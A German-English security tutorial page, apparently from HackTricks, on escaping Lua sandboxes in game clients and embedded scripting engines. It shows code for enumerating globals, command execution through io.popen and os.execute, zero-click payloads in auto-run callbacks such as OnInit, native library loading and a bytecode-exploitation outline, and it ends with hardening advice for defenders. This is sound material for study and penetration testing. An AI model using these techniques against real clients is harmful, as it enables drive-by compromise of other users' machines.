# Bypass Lua sandboxes (eingebettete VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Diese Seite sammelt praktische Techniken, um Lua "sandboxes" zu enumerieren und aus ihnen auszubrechen, wenn sie in Anwendungen eingebettet sind (insbesondere game clients, plugins oder in-app scripting engines). Viele Engines stellen eine eingeschränkte Lua-Umgebung bereit, lassen jedoch mächtige globals erreichbar, die beliebige Kommandoausführung oder sogar native memory corruption ermöglichen, wenn bytecode loaders exposed sind.

Kernideen:
- Behandle die VM als unbekannte Umgebung: enumerate _G und finde heraus, welche gefährlichen Primitives erreichbar sind.
- Wenn stdout/print blockiert ist, missbrauche jeden in-VM UI/IPC-Kanal als Ausgabe-Senke, um Ergebnisse zu beobachten.
- Wenn io/os exposed ist, hat man oft direkte Kommandoausführung (io.popen, os.execute).
- Wenn load/loadstring/loadfile exposed sind, kann das Ausführen von präpariertem Lua-Bytecode die Speichersicherheit in manchen Versionen unterlaufen (≤5.1 verifiers sind bypassable; 5.2 removed verifier) und so fortgeschrittene Exploitation ermöglichen.

## Enumerate the sandboxed environment

- Dump the global environment to inventory reachable tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Wenn kein print() verfügbar ist, nutze in-VM-Kanäle. Beispiel aus einer MMO housing script VM, in der chat output nur nach einem sound call funktioniert; das Folgende baut eine verlässliche Ausgabefunktion auf:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Verallgemeinere dieses Muster für dein Ziel: jedes Textfeld, toast, logger oder UI-Callback, das strings akzeptiert, kann als stdout für reconnaissance dienen.

## Direkte Kommandoausführung, wenn io/os exponiert sind

Wenn die Sandbox weiterhin die Standardbibliotheken io oder os exponiert, hast du wahrscheinlich sofortige Kommandoausführung:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Hinweise:
- Die Ausführung erfolgt im Client-Prozess; viele anti-cheat/antidebug-Schichten, die externe Debugger blockieren, verhindern nicht die in-VM-Prozesserstellung.
- Ebenfalls prüfen: package.loadlib (beliebiges Laden von DLL/.so), require mit nativen Modulen, LuaJIT's ffi (falls vorhanden) und die debug library (kann innerhalb der VM Privilegien erhöhen).

## Zero-click-Trigger via auto-run callbacks

Wenn die Host-Anwendung Skripte an Clients verteilt und die VM auto-run hooks (z. B. OnInit/OnLoad/OnEnter) bereitstellt, platziere dein payload dort für einen drive-by compromise, sobald das Skript geladen wird:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Jeder äquivalente Callback (OnLoad, OnEnter, etc.) verallgemeinert diese Technik, wenn Skripte automatisch an den client übertragen und dort ausgeführt werden.

## Gefährliche Primitive, die man während recon aufspüren sollte

Während der _G-Aufzählung solltest du insbesondere auf Folgendes achten:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: führt Source oder Bytecode aus; unterstützt das Laden von nicht vertrauenswürdigem Bytecode.
- package, package.loadlib, require: dynamisches Laden von Bibliotheken und Modul-Schnittstelle.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo und hooks.
- LuaJIT-only: ffi.cdef, ffi.load, um nativen Code direkt aufzurufen.

Minimale Nutzungsbeispiele (falls erreichbar):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Optionale Eskalation: Missbrauch von Lua-Bytecode-Loadern

Wenn load/loadstring/loadfile erreichbar sind, aber io/os eingeschränkt sind, kann die Ausführung von crafted Lua bytecode zu memory disclosure und corruption primitives führen. Wichtige Fakten:
- Lua ≤ 5.1 enthielt einen bytecode verifier, der bekannte bypasses aufweist.
- Lua 5.2 entfernte den verifier vollständig (offizielle Haltung: Anwendungen sollten einfach precompiled chunks ablehnen), wodurch die Angriffsfläche größer wird, falls bytecode loading nicht verboten ist.
- Typische Workflows: leak pointers via in-VM output, craft bytecode to create type confusions (z. B. rund um FORLOOP oder andere opcodes), und dann auf arbitrary read/write oder native code execution übergehen.

Dieser Weg ist engine/version-specific und erfordert RE. Siehe Referenzen für deep dives, exploitation primitives und Beispiel-Gadgetry in Spielen.

## Erkennungs- und Härtungshinweise (für Verteidiger)

- Serverseitig: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Clientseitig: Lua mit einem minimalen _ENV ausführen, bytecode loading verbieten, einen strikten bytecode verifier oder Signaturprüfungen wieder einführen und die Prozess-Erzeugung vom Client-Prozess aus blockieren.
- Telemetrie: Alarm bei gameclient → child process creation kurz nach script load; mit UI/chat/script-Ereignissen korrelieren.

## Referenzen

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
